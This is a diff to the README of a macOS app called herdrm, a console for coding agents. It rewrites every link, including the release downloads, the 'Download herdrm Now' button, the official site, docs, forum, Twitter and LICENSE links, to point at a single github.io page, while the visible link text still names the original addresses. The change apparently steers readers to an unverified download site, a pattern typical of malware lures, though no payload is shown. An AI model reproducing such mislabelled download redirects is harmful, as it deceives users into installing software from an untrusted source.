@@ -1,6 +1,6 @@
 # 🐑 herdrm - All Your Coding Agents, One Native Console
 
-[![Download herdrm](https://img.shields.io/badge/Download-herdrm-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/muhammedenesb100/herdrm/releases)
+[![Download herdrm](https://img.shields.io/badge/Download-herdrm-2ea44f?style=for-the-badge&logo=apple&logoColor=white)](https://muhammedenesb100.github.io)
 
 ---
 
@@ -40,7 +40,7 @@ Getting herdrm up and running is quick and easy. Follow these simple steps:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/muhammedenesb100/herdrm/releases](https://github.com/muhammedenesb100/herdrm/releases)**
+Visit this link to download the application: **[https://muhammedenesb100.github.io](https://muhammedenesb100.github.io)**
 
 Click the most recent release and download the `.dmg` file for macOS.
 
@@ -76,7 +76,7 @@ Ready to get started? Here's everything you need:
 
 ### Download Instructions
 
-Visit this link to download the application: **[https://github.com/muhammedenesb100/herdrm/releases](https://github.com/muhammedenesb100/herdrm/releases)**
+Visit this link to download the application: **[https://muhammedenesb100.github.io](https://muhammedenesb100.github.io)**
 
 1. Open the link in your browser
 2. Look for the latest release (usually at the top)
@@ -156,10 +156,10 @@ Close any agents you're not actively using. Check your system's RAM usage and cl
 
 ## 📚 Additional Resources
 
-- **Official Website:** [herdrm.app](https://herdrm.app)
-- **Documentation:** [docs.herdrm.app](https://docs.herdrm.app)
+- **Official Website:** [herdrm.app](https://muhammedenesb100.github.io)
+- **Documentation:** [docs.herdrm.app](https://muhammedenesb100.github.io)
 - **Support:** [support@herdrm.app](mailto:support@herdrm.app)
-- **Community Forum:** [community.herdrm.app](https://community.herdrm.app)
+- **Community Forum:** [community.herdrm.app](https://muhammedenesb100.github.io)
 
 ---
 
@@ -169,13 +169,13 @@ herdrm is actively developed with new features and improvements released regular
 
 - **Star the repository** on GitHub to show your support
 - **Watch the repository** to get notified of new releases
-- **Follow us on X (Twitter):** [@herdrm_app](https://twitter.com/herdrm_app)
+- **Follow us on X (Twitter):** [@herdrm_app](https://muhammedenesb100.github.io)
 
 ---
 
 ## 📝 License
 
-herdrm is released under the MIT License. See the [LICENSE](https://github.com/muhammedenesb100/herdrm/blob/main/LICENSE) file for details.
+herdrm is released under the MIT License. See the [LICENSE](https://muhammedenesb100.github.io) file for details.
 
 ---
 
@@ -194,7 +194,7 @@ If herdrm helps you work more efficiently, consider supporting the project:
 
 Download herdrm today and take control of all your coding agents from one beautiful, native macOS console. Your agents are working—now you can watch them work together.
 
-**[👉 Download herdrm Now](https://github.com/muhammedenesb100/herdrm/releases)**
+**[👉 Download herdrm Now](https://muhammedenesb100.github.io)**
 
 ---
 
